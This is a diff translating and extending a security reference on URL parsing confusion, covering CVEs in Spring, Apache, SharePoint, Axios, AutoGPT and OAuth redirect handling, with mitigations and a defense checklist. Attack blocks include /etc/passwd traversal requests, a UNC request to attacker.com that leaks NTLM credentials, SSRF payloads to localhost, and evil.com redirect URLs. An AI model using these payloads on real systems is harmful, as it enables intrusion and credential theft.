-일부 브라우저: 정규화하여 trusted.com
-일부 필터: 문자열 매칭 실패 → 차단 또는 허용 불일치
+Some browsers: Normalize to trusted.com
+Some filters: String matching fails → Block or allow inconsistency
 ```
 
-**실제 사례**:
-- **2017년 Xudong Zheng**: `xn--80ak6aa92e.com` (Cyrillic으로 `apple.com` 스푸핑)이 모든 주요 브라우저에서 시각적으로 구분 불가능하게 표시됨
-- **HostSplit/HostBond (Black Hat USA 2019)**: 유니코드 정규화를 이용한 도메인 위장 기법 발표
+**Real-World Cases**:
+- **2017 Xudong Zheng**: `xn--80ak6aa92e.com` (Cyrillic spoofing `apple.com`) displayed indistinguishably in all major browsers
+- **HostSplit/HostBond (Black Hat USA 2019)**: Presented domain masquerading techniques exploiting Unicode normalization
 
-**스펙 기반 방어**:
-- **RFC 3987 §3.2**: IRI는 URI로 변환 시 percent-encoding 필요
-- **WHATWG §3.3**: Domain to ASCII (Punycode) 변환 필수
-- **실무 권장**:
-  - IDN 사용 시 Punycode 형태로 변환 후 검증
-  - Mixed-script domain 차단 (Latin + Cyrillic 혼용 등)
-  - 브라우저: Punycode 형태로 표시 (Chrome 정책)
-  - Zero-width, invisible 문자 제거
+**Spec-Based Defense**:
+- **RFC 3987 §3.2**: IRI requires percent-encoding when converting to URI
+- **WHATWG §3.3**: Domain to ASCII (Punycode) conversion required
+- **Practical Recommendations**:
+  - Convert to Punycode form before validation when using IDN
+  - Block mixed-script domains (mixing Latin + Cyrillic, etc.)
+  - Browsers: Display in Punycode form (Chrome policy)
+  - Remove zero-width, invisible characters
 
 ---
 
-## 제4부: 최신 CVE 및 공격 사례 종합
+## Part 4: Comprehensive CVE and Attack Case Studies
 
-### 18. Spring Framework URL 파싱 취약점 (CVE-2024-22259, CVE-2024-22243, CVE-2024-22262)
+### 18. Spring Framework URL Parsing Vulnerabilities (CVE-2024-22259, CVE-2024-22243, CVE-2024-22262)
 
-**취약점 설명**:
-Spring Framework의 `UriComponentsBuilder`가 외부 제공 URL을 파싱하고 호스트 검증을 수행할 때, 검증과 실제 HTTP 요청 간 파싱 차이로 인해 SSRF 및 Open Redirect 발생.
+**Vulnerability Description**:
+When Spring Framework's `UriComponentsBuilder` parses externally-provided URLs and performs host validation, parsing differences between validation and actual HTTP requests lead to SSRF and Open Redirect.
 
-**영향 받는 버전**:
+**Affected Versions**:
 - Spring Framework 6.1.0 ~ 6.1.4
 - Spring Framework 6.0.0 ~ 6.0.17
 - Spring Framework 5.3.0 ~ 5.3.32
 
-**공격 메커니즘**:
+**Attack Mechanism**:
 ```java
-// 취약한 코드 패턴
+// Vulnerable code pattern
 String userProvidedUrl = request.getParameter("url");
 
-// 1단계: UriComponentsBuilder로 파싱 및 검증
+// Stage 1: Parse and validate with UriComponentsBuilder
 UriComponents uri = UriComponentsBuilder.fromUriString(userProvidedUrl).build();
 String host = uri.getHost();
 
-if (allowedHosts.contains(host)) {  // 호스트 검증
-    // 2단계: 실제 HTTP 요청
-    restTemplate.getForObject(userProvidedUrl, String.class);  // 다른 파서 사용!
+if (allowedHosts.contains(host)) {  // Host validation
+    // Stage 2: Actual HTTP request
+    restTemplate.getForObject(userProvidedUrl, String.class);  // Uses different parser!
 }
 ```
 
-**스펙 관련 근본 원인**:
-- `UriComponentsBuilder`와 실제 HTTP 클라이언트(Apache HttpClient, OkHttp 등)가 다른 파싱 로직 사용
-- RFC 3986 해석 차이 (특히 authority 컴포넌트 추출)
+**Spec-Related Root Cause**:
+- `UriComponentsBuilder` and actual HTTP clients (Apache HttpClient, OkHttp, etc.) use different parsing logic
+- RFC 3986 interpretation differences (especially authority component extraction)
 
-**패치 및 완화**:
-- Spring Framework 6.1.5, 6.0.18, 5.3.33 이상 업그레이드
-- 또는 검증과 요청에 동일한 파서 사용
+**Patch and Mitigation**:
+- Upgrade to Spring Framework 6.1.5, 6.0.18, 5.3.33 or higher
+- Or use same parser for validation and requests
 
 ---
 
 ### 19. SharePoint XXE via URL Parsing Confusion (CVE-2024-30043)
 
-**취약점 설명**:
-SharePoint Server와 Cloud에서 URL 파싱 혼동을 악용하여 XXE (XML External Entity) 주입 → 파일 읽기 및 SSRF.
+**Vulnerability Description**:
+URL parsing confusion in SharePoint Server and Cloud exploited for XXE (XML External Entity) injection → File reading and SSRF.
 
-**공격 메커니즘**:
-1. SharePoint의 XML 파서와 URL 검증 로직이 서로 다른 URL 해석
-2. 공격자가 조작된 URL을 XML에 삽입
-3. URL 검증 레이어: 안전한 호스트로 판단
-4. XML 파서: 외부 엔티티로 내부 파일 또는 내부 네트워크 접근
+**Attack Mechanism**:
+1. SharePoint's XML parser and URL validation logic interpret URLs differently
+2. Attacker inserts manipulated URL into XML
+3. URL validation layer: Judges as safe host
+4. XML parser: Accesses internal files or internal network via external entity
 
-**스펙 관련 근본 원인**:
-- XML 명세와 URI 명세 간 상호작용 불일치
-- URL 파싱 differential (parser A vs parser B)
+**Spec-Related Root Cause**:
+- Interaction inconsistency between XML specification and URI specification
+- URL parsing differential (parser A vs parser B)
 
-**패치**:
-- Microsoft 2024년 5월 보안 업데이트 적용
+**Patch**:
+- Apply Microsoft May 2024 security update
 
 ---
 
 ### 20. Apache HTTP Server Confusion Attacks (CVE-2024-38473, CVE-2024-38476, CVE-2024-38477)
 
-**연구자**: Orange Tsai (DEVCORE), Black Hat USA 2024
+**Researcher**: Orange Tsai (DEVCORE), Black Hat USA 2024
 
-**취약점 개요**:
-Apache HTTP Server의 아키텍처 설계상 3가지 혼동 공격:
-1. **Filename Confusion**: `r->filename` 필드가 파일시스템 경로여야 하지만 일부 모듈이 URL로 취급
-2. **DocumentRoot Confusion**: 절대 경로 접근 시 DocumentRoot 검증 우회
-3. **Handler Confusion**: 요청 핸들러 선택 로직 혼동
+**Vulnerability Overview**:
+3 types of confusion attacks in Apache HTTP Server's architectural design:
+1. **Filename Confusion**: `r->filename` field should be filesystem path but some modules treat it as URL
+2. **DocumentRoot Confusion**: DocumentRoot validation bypass when accessing via absolute path
+3. **Handler Confusion**: Request handler selection logic confusion
 
-**공격 벡터**:
+**Attack Vectors**:
 ```
-예시 1: DocumentRoot 탈출
+Example 1: DocumentRoot Escape
 GET /cgi-bin/../../../../../etc/passwd HTTP/1.1
 
-예시 2: ACL 우회
+Example 2: ACL Bypass
 GET /protected/resource?query HTTP/1.1
-→ '?' 하나로 ACL/Auth 우회
+→ Single '?' bypasses ACL/Auth
 
-예시 3: 백슬래시를 이용한 NTLM 강제 인증
+Example 3: Forced NTLM Authentication via Backslash
 GET \\attacker.com\share HTTP/1.1
-→ UNC 경로로 해석 → NTLM 인증 전송 → SSRF → NTLM Relay → RCE
+→ Interpreted as UNC path → NTLM auth sent → SSRF → NTLM Relay → RCE
 ```
 
-**스펙 관련 근본 원인**:
-- URL 파싱과 파일시스템 경로 처리의 경계 불명확
-- RFC 3986의 경로 구분자와 파일시스템 구분자 혼동
+**Spec-Related Root Cause**:
+- Unclear boundary between URL parsing and filesystem path processing
+- Confusion between RFC 3986 path delimiters and filesystem delimiters
 
-**패치**:
-- Apache HTTP Server 2.4.60 (2024년 7월 1일)
+**Patch**:
+- Apache HTTP Server 2.4.60 (July 1, 2024)
 
 ---
 
 ### 21. URL Normalization SSRF in Axios (#7315)
 
-**취약점 설명**:
-JavaScript HTTP 클라이언트 라이브러리 Axios가 URL을 자동 정규화하여 SSRF 필터 우회.
+**Vulnerability Description**:
+JavaScript HTTP client library Axios auto-normalizes URLs, bypassing SSRF filters.
 
-**공격 메커니즘**:
+**Attack Mechanism**:
 ```javascript
-// 공격자 입력
-const url = "https:google.com";  // 슬래시 누락
+// Attacker input
+const url = "https:google.com";  // Missing slash
 
-// 보안 필터: "://" 패턴 확인
+// Security filter: Check for "://" pattern
 if (!url.includes("://")) {
-    throw new Error("Invalid URL");  // 차단
+    throw new Error("Invalid URL");  // Block
 }
 
-// Axios: 자동 정규화
-axios.get(url);  // 내부적으로 https://google.com 으로 변환 → SSRF
+// Axios: Auto-normalization
+axios.get(url);  // Internally converts to https://google.com → SSRF
 ```
 
-**스펙 관련 근본 원인**:
-- RFC 3986: Scheme 후 `://` 필수
-- Axios: 관대한 파싱으로 자동 수정
+**Spec-Related Root Cause**:
+- RFC 3986: `://` required after scheme
+- Axios: Lenient parsing with auto-correction
 
-**완화**:
-- Axios 최신 버전 사용 또는 URL 검증 강화
+**Mitigation**:
+- Use latest Axios version or strengthen URL validation
 
 ---
 
 ### 22. Path Traversal via Percent-Encoding (CVE-2021-41773, CVE-2021-42013)
 
-**취약점 설명**:
-Apache HTTP Server 2.4.49, 2.4.50에서 경로 정규화 로직 변경으로 percent-encoding된 경로 순회 문자가 처리되지 않아 인증 우회 및 임의 파일 읽기.
+**Vulnerability Description**:
+In Apache HTTP Server 2.4.49, 2.4.50, path normalization logic changes caused percent-encoded path traversal characters to not be processed, leading to authentication bypass and arbitrary file reading.
 
-**공격 메커니즘**:
+**Attack Mechanism**:
 ```
 GET /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
 
-2.4.49 이전: /.%2e/ → /../ 정규화 → 경로 순회 차단
-2.4.49: /.%2e/를 정규화하지 않음 → 그대로 통과 → /etc/passwd 접근
+Before 2.4.49: /.%2e/ → /../ normalized → Path traversal blocked
+2.4.49: Doesn't normalize /.%2e/ → Passes as-is → /etc/passwd access
 ```
 
-**스펙 관련 근본 원인**:
-- RFC 3986 §6.2.2: Percent-decoding과 경로 정규화의 순서 불명확
-- 구현 변경 시 보안 함의 미고려
+**Spec-Related Root Cause**:
+- RFC 3986 §6.2.2: Unclear ordering of percent-decoding and path normalization
+- Security implications not considered during implementation changes
 
-**패치**:
-- Apache 2.4.51 이상
-
----
-
-## 부록: 공격-스펙-방어 매핑 종합표
-
-| 공격 유형 | 악용하는 스펙 동작 | RFC/스펙 참조 | 공격 예시 | 스펙 기반 방어 |
-|----------|------------------|--------------|---------|--------------|
-| **Scheme Confusion** | RFC 3986은 scheme 필수, WHATWG는 상대 URL 허용 | RFC 3986 §3 vs WHATWG §4.1 | `google.com/abc` → 파서마다 다른 해석 | 절대 URI만 허용, 동일 파서 사용 |
-| **Userinfo Spoofing** | `user:pass@host` 문법은 deprecated이지만 유효 | RFC 3986 §3.2.1, §7.5 | `https://trusted.com@evil.com` | Userinfo 포함 URL 거부, WHATWG 정책 따름 |
-| **Percent-Encoding 재귀 디코딩** | 재귀 디코딩 금지 규칙 미준수 | RFC 3986 §2.4 MUST | `%252e%252e%252f` → 2회 디코딩 → `../` | 정확히 1회만 디코딩, 재귀 금지 |
-| **Slashes/Backslash Confusion** | 백슬래시 처리 불명확 | RFC 3986 (명시 없음) vs WHATWG | `https:\\evil.com` | 백슬래시 포함 URL 거부 또는 명시적 정규화 |
-| **IP Address Obfuscation** | 레거시 IP 표기법 지원 | RFC 3986 §7.4 | `http://0177.0.0.1` (8진수) | 모든 IP 형식 정규화 후 검증, 전용 IP 파서 사용 |
-| **Fragment-based XSS** | Fragment는 서버 전송 안 됨 | RFC 3986 §3.5 | `#<script>alert(1)</script>` | Fragment 입력 검증, CSP 강화 |
-| **Host Extraction 불일치** | `getHost()` 메서드마다 다른 동작 | 구현체 차이 | Java URL vs Python urlparse | RFC 3986 기준 명시적 파싱, allow-list 검증 |
-| **URL Encoding Confusion** | 인코딩된 호스트 처리 불일치 | RFC 3986 §2.1 | `http://127.%30.%30.1` | 입력 즉시 디코딩, 정규화 후 검증 |
-| **Tabs/Newlines 제거** | WHATWG는 제어 문자 자동 제거 | WHATWG §4.1 | `http://trusted\n.com@evil.com` | 제어 문자 발견 시 거부 (자동 제거 금지) |
-| **Case Sensitivity 악용** | Scheme/host는 대소문자 무시, path는 구분 | RFC 3986 §6.2.2.1 | `/Admin` vs `/admin` | 서버 처리 방식과 일치하는 검증 |
-| **Path Traversal** | 경로 정규화 알고리즘 | RFC 3986 §6.2.2.3 | `../../etc/passwd` | Decode → Normalize → Validate 순서 엄수 |
-| **Default Port 불일치** | 기본 포트 생략 가능 | RFC 3986 §6.2.3 | `:80` vs 생략 | 기본 포트 제거 정규화, 정규화된 형태로 정책 저장 |
-| **Trailing Dot Confusion** | WHATWG는 구분, DNS는 FQDN | WHATWG 설계 결정 | `example.com` vs `example.com.` | Trailing dot 제거 또는 명시적 거부 |
-| **IDN Homograph** | 유니코드 시각적 유사성 | RFC 3987, WHATWG §3.3 | Cyrillic 'а' vs Latin 'a' | Punycode 변환, mixed-script 차단 |
-| **Cache Key Confusion** | 정규화되지 않은 URL → 다른 캐시 키 | RFC 3986 §6.2.2 | `/api` vs `/api/%2F` | 정규화된 URL로 캐시 키 생성 |
-| **Parser Differential SSRF** | 검증 파서 ≠ 요청 파서 | 구현체 간 불일치 | Spring UriComponentsBuilder | 동일 파서 사용, Spring 패치 적용 |
+**Patch**:
+- Apache 2.4.51 or higher
 
 ---
 
-## 부록: 보안 검증 체크리스트
+### 23. AutoGPT SSRF via URL Parsing Confusion (CVE-2025-0454)
 
-### 입력 검증 단계
+**Vulnerability Description**:
+Server-Side Request Forgery (SSRF) vulnerability in autogpt (significant-gravitas/autogpt) versions prior to v0.4.0 due to hostname confusion between `urlparse` and `requests` library.
 
-- [ ] **1. 절대 URI 강제**: Scheme이 명시된 절대 URI만 허용 (상대 URL 거부)
-- [ ] **2. Userinfo 금지**: `user:pass@host` 형식 포함된 URL 즉시 거부
-- [ ] **3. 제어 문자 검사**: 탭(`\t`), 개행(`\n`, `\r`), NULL 등 제어 문자 포함 시 거부 (자동 제거 금지)
-- [ ] **4. 백슬래시 검사**: 백슬래시(`\`) 포함 시 거부 또는 명시적 정규화 정책 수립
+**Affected Versions**:
+- autogpt versions < v0.4.0
 
-### 정규화 단계
+**Attack Mechanism**:
+```python
+# Vulnerable code pattern
+from urllib.parse import urlparse
+import requests
 
-- [ ] **5. Percent-Decoding (1회만)**: 입력 받은 즉시 정확히 1회 디코딩 (재귀 디코딩 금지)
-- [ ] **6. Unreserved 문자 디코딩**: `A-Za-z0-9-._~` 인코딩 발견 시 디코딩
-- [ ] **7. Scheme/Host 소문자화**: Scheme과 Host만 소문자 변환 (Path는 대소문자 유지)
-- [ ] **8. 경로 정규화**: `remove_dot_segments` 알고리즘 적용 (`. `와 `..` 제거)
-- [ ] **9. 기본 포트 제거**: HTTP:80, HTTPS:443 등 기본 포트 명시 시 제거
-- [ ] **10. Trailing Dot 처리**: 도메인 끝의 `.` 제거 또는 명시적 정책 수립
-- [ ] **11. IDN Punycode 변환**: 유니코드 도메인을 Punycode로 변환
+url = "http://localhost:\@google.com/../"
 
-### 보안 검증 단계
+# Stage 1: urlparse validation
+parsed = urlparse(url)
+# urlparse interprets: hostname = "localhost:" (with colon!)
 
-- [ ] **12. IP 주소 정규화**: 8진수, 16진수, 정수 표기 등 모든 형식을 정규 형식으로 변환 후 검증
-- [ ] **13. Allow-list 검증**: Scheme, Host, Port 조합을 allow-list와 비교 (deny-list 사용 금지)
-- [ ] **14. 내부 IP 차단**: 정규화된 IP가 내부 네트워크 범위인지 검사 (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16 등)
-- [ ] **15. 경로 범위 검증**: 정규화된 경로가 DocumentRoot 또는 허용된 디렉토리 내부인지 검증
-- [ ] **16. Symlink 검증**: Symlink 경로를 실제 경로로 해석 (`realpath()`) 후 재검증
+if parsed.hostname != "localhost":  # False - validation passes!
+    # Stage 2: requests library
+    requests.get(url)  # requests interprets differently → SSRF
+```
 
-### 실행 단계
+The hostname confusion involves colon-slash constructs (`:\@`) that tricked the parser into treating localhost as remote.
 
-- [ ] **17. 동일 파서 사용**: 검증에 사용한 파서와 동일한 파서로 실제 요청 수행
-- [ ] **18. 재파싱 금지**: 검증 후 URL을 절대 재파싱하지 않음 (검증된 객체 재사용)
-- [ ] **19. 리다이렉트 제한**: HTTP 리다이렉트 자동 추적 비활성화 또는 리다이렉트 대상도 검증
-- [ ] **20. 타임아웃 설정**: 연결 타임아웃 및 읽기 타임아웃 짧게 설정하여 slowloris 공격 방지
+**Spec-Related Root Cause**:
+- **urllib.parse.urlparse**: Includes colon in hostname extraction for certain malformed URLs
+- **requests library**: Parses the URL differently, removing the colon and treating as localhost
+- Violation of "validate the final parsed hostname" principle
 
-### 로깅 및 모니터링
+**CVSS Score**: 7.5 (High)
 
-- [ ] **21. URL 마스킹**: 로그 기록 전 URL에서 Userinfo, Fragment, 민감한 쿼리 파라미터 마스킹
-- [ ] **22. 실패 로깅**: URL 검증 실패 시 입력값과 실패 원인 로깅 (공격 패턴 분석용)
-- [ ] **23. 이상 패턴 감지**: 동일 IP에서 반복적인 검증 실패 시 알림
-
-### 아키텍처 수준
-
-- [ ] **24. 단일 URL 파서 라이브러리**: 전체 애플리케이션에서 하나의 검증된 URL 파서 라이브러리만 사용
-- [ ] **25. 정기적 업데이트**: URL 파서 라이브러리 및 HTTP 클라이언트 최신 버전 유지 (CVE 모니터링)
-- [ ] **26. 최소 권한 원칙**: URL 요청을 처리하는 서비스 계정의 권한 최소화
+**Patch and Mitigation**:
+- Upgrade to autogpt v0.4.0 or higher
+- Always validate the **final parsed hostname** used by the actual request library, not just the validation parser
+- Use the same parser for both validation and execution
 
 ---
 
-## 참고 문헌 및 출처
+### 24. mod_auth_openidc Open Redirect via URL Parsing Differential (CVE-2021-39191, CVE-2021-32786)
 
-### RFC 및 표준 스펙
+**Vulnerability Description**:
+URL parsing differential between Apache HTTP Server and modern browsers in mod_auth_openidc (popular Apache2 OAuth/OpenID Connect module) leading to Open Redirect in logout functionality.
+
+**Affected Versions**:
+- mod_auth_openidc < 2.4.9
+- Specifically affects logout redirect_uri validation
+
+**Attack Mechanism**:
+```
+Attack Vector: Backslash Confusion
+
+Normal logout:
+https://oauth-app.com/logout?redirect_uri=https://trusted.com
+
+Attack with backslash:
+https://oauth-app.com/logout?redirect_uri=/\tevil.com
+                                                    ↑ Tab character
+
+Validation (oidc_validate_redirect_url):
+- Checks if URL starts with "/" → Appears to be relative path → Allowed
+
+Browser interpretation:
+- Parses /\tevil.com as absolute URL → Redirects to evil.com
+```
+
+**Spec-Related Root Cause**:
+- **Apache2 mod_auth_openidc**: The `oidc_validate_redirect_url()` function doesn't properly parse URLs starting with `/\t` (forward slash + tab)
+- **Modern browsers**: Treat backslash as equivalent to forward slash in certain contexts
+- WHATWG vs RFC 3986 interpretation differences
+
+**Impact**:
+- CVSS Score: 4.7 (Medium)
+- Open Redirect leading to phishing attacks
+- OAuth token/code interception
+
+**Patch**:
+- Fixed in mod_auth_openidc version 2.4.12.2
+- Maintainers responded and patched within 24 hours
+
+---
+
+### 25. parse-url Library SSRF Vulnerabilities (CVE-2022-2216, CVE-2022-2900)
+
+**Vulnerability Description**:
+Multiple SSRF vulnerabilities in the parse-url npm library due to improper detection of protocol, resource, and pathname fields.
+
+**Affected Versions**:
+- parse-url < 8.1.0 (CVE-2022-2216)
+- parse-url < 6.0.2 (CVE-2022-2900)
+
+**Attack Mechanism**:
+```javascript
+// Vulnerable code using parse-url
+const parseUrl = require("parse-url");
+
+// Attack payload
+const maliciousUrl = "http://127.0.0.1#@attacker.com/";
+
+const parsed = parseUrl(maliciousUrl);
+// Library incorrectly parses components
+
+// Validation checks parsed.resource
+if (allowedDomains.includes(parsed.resource)) {
+    // Assumes checking attacker.com
+    fetch(maliciousUrl); // Actually requests 127.0.0.1
+}
+```
+
+**Spec-Related Root Cause**:
+- Incorrect handling of fragment identifier (`#`) in authority component
+- Confusion between userinfo and fragment delimiters
+- Non-compliance with RFC 3986 component extraction rules
+
+**Impact**:
+- SSRF attacks bypassing domain validation
+- Access to internal network resources
+- Cloud metadata endpoint access (AWS, GCP, Azure)
+
+**Patch**:
+- Upgrade to parse-url 8.1.0 or higher
+
+---
+
+### 26. OAuth "Evil Slash" Attacks (Black Hat Asia 2019)
+
+**Research**: "Make Redirection Evil Again: URL Parser Issues in OAuth" by Xianbo Wang et al.
+
+**Overview**:
+Comprehensive study of new OAuth redirection attack techniques exploiting URL parsing inconsistencies in mainstream browsers and mobile apps.
+
+**Attack Techniques**:
+
+1. **Evil Slash Trick**:
+```
+Legitimate redirect_uri: https://trusted.com/callback
+
+Attack variations:
+- https://trusted.com\@evil.com/callback
+- https://trusted.com/\@evil.com/callback
+- https://trusted.com//evil.com/callback
+- https://trusted.com\tevil.com/callback
+
+Validation: Checks if URL starts with "https://trusted.com" → Pass
+Browser: Interprets differently → Redirects to evil.com
+```
+
+2. **Domain Whitelist Bypass**:
+```
+Whitelist check: "Does redirect_uri contain trusted.com?"
+
+Attack: https://evil.com?redirect=trusted.com
+       https://evil.com#trusted.com
+       https://trusted.com@evil.com
+```
+
+**Impact**:
+- **Scope**: Study of 50 OAuth service providers worldwide
+- **Affected**: 10,000+ OAuth client apps
+- **Users**: Tens of millions of end-users vulnerable
+- **Consequences**: Account hijacking, sensitive data access, privilege escalation
+
+**Attack Outcomes**:
+- Steal OAuth authorization codes
+- Steal OAuth access tokens
+- Full account takeover
+- Access to cloud resources (API keys, storage)
+
+**Tools Released**:
+- [redirect-fuzzer](https://github.com/SaneBow/redirect-fuzzer): Fuzzing tool for OAuth redirect_url validators
+
+**Mitigation**:
+- Exact string matching for redirect_uri validation (not prefix or contains)
+- Use allowlist of full redirect URIs, not domain-based validation
+- Implement RFC 8252 recommendations for native apps
+
+---
+
+### 27. TOCTOU (Time-of-Check Time-of-Use) in URL Validation
+
+**Vulnerability Pattern**:
+Race condition between URL validation and actual HTTP request execution, particularly with DNS-based validation.
+
+**Attack Mechanism**:
+```python
+# Vulnerable code pattern
+def make_request(url):
+    # Stage 1: Time of Check - DNS validation
+    parsed = urlparse(url)
+    ip = socket.gethostbyname(parsed.hostname)
+
+    if is_internal_ip(ip):  # Check: 1.2.3.4 (external) → Allow
+        raise SecurityError("Internal IP blocked")
+
+    # ⚠️ TIME GAP - Attacker can change DNS here
+
+    # Stage 2: Time of Use - Actual request
+    response = requests.get(url)  # Use: Now resolves to 127.0.0.1!
+    return response
+```
+
+**DNS Rebinding Attack**:
+```
+1. Attacker registers: attacker.com
+2. DNS server configured with very short TTL (1 second)
+
+Initial DNS query (validation):
+attacker.com → 1.2.3.4 (public IP)
+Validation: Not internal → Pass
+
+After validation, before request:
+DNS TTL expires, attacker changes record
+
+Second DNS query (actual request):
+attacker.com → 127.0.0.1 (localhost)
+Request: Accesses internal service!
+```
+
+**Real-World Example**:
+```
+Complete SSRF Protection Bypass via TOCTOU (Manager.io)
+
+The system validates DNS responses before HTTP requests
+BUT the HTTP client follows redirects autonomously
+Result: Initial validation bypassed by redirect to internal IP
+```
+
+**Spec-Related Root Cause**:
+- RFC 3986 doesn't address timing of hostname resolution
+- No specification for when DNS queries should occur relative to validation
+- HTTP client libraries often re-resolve DNS independently
+
+**Mitigation Strategies**:
+1. **Pin resolved IP**: Validate DNS, then force HTTP client to use that specific IP
+2. **Disable redirects**: Don't follow HTTP redirects automatically
+3. **Re-validate after resolution**: Check IP again immediately before request
+4. **Use connection pooling**: Reuse validated connections
+5. **Atomic operations**: Combine validation and request in single atomic operation
+
+**2023 Research Update**:
+- W3C Local Network Access specification aims to prevent DNS rebinding
+- Google deployed DNS Bit 0x20 feature (January 2023) to make cache poisoning harder
+- NCC Group Singularity framework for testing DNS rebinding defenses
+
+---
+
+### 28. "yoU aRe a Liar" - Systematic URL Parser Testing Framework (2022)
+
+**Research**: IEEE Security and Privacy Workshops (SPW) 2022
+**Authors**: Dashmeet Kaur Ajmani, Igibek Koishybayev, Alexandros Kapravelos
+
+**Overview**:
+First unified framework for cross-testing URL parsers, exposing systematic inconsistencies across implementations.
+
+**Methodology**:
+1. Collected testing suites from 8 popular URL parsers
+2. Extracted 1,445 URLs from their test cases
+3. Cross-tested every URL against all 8 parsers
+4. Analyzed inconsistencies
+
+**Parsers Tested**:
+- cURL (C)
+- Chromium (C++)
+- Python urllib
+- Java URL/URI
+- Node.js url
+- Go net/url
+- Ruby URI
+- Whatwg-url (JavaScript reference implementation)
+
+**Key Findings**:
+
+**4,262 total inconsistencies discovered**:
+- **56% were Same-Origin Policy (SOP) differences**
+- Different parsing of scheme, host, port leading to SOP bypass
+- Critical for browser security model
+
+**Categories of Inconsistencies**:
+
+1. **Scheme Parsing**:
+   - Some parsers require `://` after scheme
+   - Others accept single `:` or no delimiter
+   - Leads to scheme confusion attacks
+
+2. **Host Extraction**:
+   - Different handling of userinfo (`user:pass@`)
+   - IPv6 literal parsing differences (`[::1]`)
+   - Port number inclusion/exclusion
+
+3. **Path Normalization**:
+   - `.` and `..` segment handling
+   - Percent-encoding in path traversal
+   - Case sensitivity differences
+
+4. **Query and Fragment**:
+   - Fragment delimiter precedence
+   - Query parameter parsing in userinfo
+
+**Security Implications**:
+
+```
+Example: SOP Bypass via Parser Differential
+
+URL: http://user@evil.com:80@trusted.com/
+
+Parser A (Browser):
+- host: "trusted.com"
+- SOP check: Allows access to trusted.com cookies
+
+Parser B (Backend validation):
+- host: "user@evil.com:80@trusted.com" (entire string)
+- Validation: Rejects (not in allowlist)
+
+Attacker bypasses backend validation but gains browser access
+```
+
+**Impact on Real Systems**:
+- Phishing attacks via URL spoofing
+- SSRF via validation bypass
+- Remote code execution via parser confusion
+- Cross-site scripting via SOP bypass
+
+**Recommendations**:
+1. Standardize URL parsing across security-critical components
+2. Use RFC 3986-compliant parsers
+3. Test parsers with adversarial inputs
+4. Implement parser differential detection in CI/CD
+
+**Tools & Resources**:
+- Framework available for testing custom parsers
+- Test suite with 1,445+ edge case URLs
+- Academic paper: [yoU aRe a Liar](https://secweb.work/papers/2022/ajmani2022youare.pdf)
+
+---
+
+### 29. Claroty Team82 & Snyk Joint Research: URL Confusion in Industrial Systems
+
+**Research Date**: 2022-2023
+**Scope**: Industrial/OT systems, 16 URL parsing libraries
+
+**Key Findings**:
+
+**Five Classes of URL Confusion**:
+
+1. **Scheme Confusion**:
+   - No scheme vs. default scheme assumption
+   - `//host/path` interpreted as scheme-less or `file://`
+
+2. **Slashes Confusion**:
+   - Single `/` vs double `//` after scheme
+   - `http:/evil.com` vs `http://evil.com`
+
+3. **Backslash Confusion**:
+   - Windows path separators in URLs
+   - `http:\\host` treated as `http://host` or error
+
+4. **URL Encoded Data Confusion**:
+   - When to decode: before or after validation
+   - Recursive decoding vs. single-pass
+
+5. **Scheme Mixup**:
+   - Confusion between `http`, `https`, `file`, `ftp`
+   - Default scheme inference inconsistencies
+
+**Vulnerable Libraries Examined**:
+- urllib (Python)
+- urllib3 (Python)
+- cURL
+- Chrome
+- Java URL and URI classes
+- PHP parse_url
+- Node.js url module
+- Go net/url
+- Ruby URI
+- Perl URI
+- And 6 others
+
+**Discovered Vulnerabilities**:
+- **8 vulnerabilities** privately disclosed and patched
+- Potential for:
+  - Denial of Service (DoS)
+  - Information leaks
+  - Remote Code Execution (RCE) in some cases
+
+**Industrial Control Systems Impact**:
+- OT/ICS environments particularly vulnerable
+- Legacy systems with outdated parsers
+- Safety-critical systems affected
+- Recommendation: Immediate patching required
+
+**SecurityWeek Advisory (2023)**:
+> "Industrial firms advised not to ignore security risks posed by URL parsing confusion"
+
+**Mitigation for Industrial Systems**:
+1. Inventory all systems using URL parsing
+2. Identify which parsing library/version in use
+3. Test with fuzzing frameworks
+4. Apply vendor patches immediately
+5. Implement network segmentation
+6. Monitor for anomalous URL patterns
+
+---
+
+## Appendix: Attack-Spec-Defense Mapping Table
+
+| Attack Type | Exploited Spec Behavior | RFC/Spec Reference | Attack Example | Spec-Based Defense |
+|------------|------------------------|-------------------|---------------|-------------------|
+| **Scheme Confusion** | RFC 3986 requires scheme, WHATWG allows relative URLs | RFC 3986 §3 vs WHATWG §4.1 | `google.com/abc` → Different parser interpretations | Allow absolute URIs only, use same parser |
+| **Userinfo Spoofing** | `user:pass@host` syntax deprecated but valid | RFC 3986 §3.2.1, §7.5 | `https://trusted.com@evil.com` | Reject URLs with userinfo, follow WHATWG policy |
+| **Percent-Encoding Recursive Decoding** | Non-compliance with prohibition on recursive decoding | RFC 3986 §2.4 MUST | `%252e%252e%252f` → 2 decodings → `../` | Decode exactly once, prohibit recursion |
+| **Slashes/Backslash Confusion** | Unclear backslash handling | RFC 3986 (not specified) vs WHATWG | `https:\\evil.com` | Reject URLs with backslashes or explicit normalization |
+| **IP Address Obfuscation** | Legacy IP notation support | RFC 3986 §7.4 | `http://0177.0.0.1` (octal) | Normalize all IP formats before validation, use dedicated IP parser |
+| **Fragment-based XSS** | Fragment not sent to server | RFC 3986 §3.5 | `#<script>alert(1)</script>` | Fragment input validation, strengthen CSP |
+| **Host Extraction Inconsistency** | Different behavior per `getHost()` method | Implementation differences | Java URL vs Python urlparse | Explicit parsing per RFC 3986, allow-list validation |
+| **URL Encoding Confusion** | Encoded host processing inconsistency | RFC 3986 §2.1 | `http://127.%30.%30.1` | Decode immediately on input, validate after normalization |
+| **Tabs/Newlines Removal** | WHATWG auto-removes control characters | WHATWG §4.1 | `http://trusted\n.com@evil.com` | Reject on finding control characters (prohibit auto-removal) |
+| **Case Sensitivity Exploitation** | Scheme/host case-insensitive, path case-sensitive | RFC 3986 §6.2.2.1 | `/Admin` vs `/admin` | Validation matching server handling |
+| **Path Traversal** | Path normalization algorithm | RFC 3986 §6.2.2.3 | `../../etc/passwd` | Strictly follow Decode → Normalize → Validate order |
+| **Default Port Inconsistency** | Default port can be omitted | RFC 3986 §6.2.3 | `:80` vs omitted | Normalize by removing default port, store policies in normalized form |
+| **Trailing Dot Confusion** | WHATWG distinguishes, DNS uses FQDN | WHATWG design decision | `example.com` vs `example.com.` | Remove trailing dot or explicitly reject |
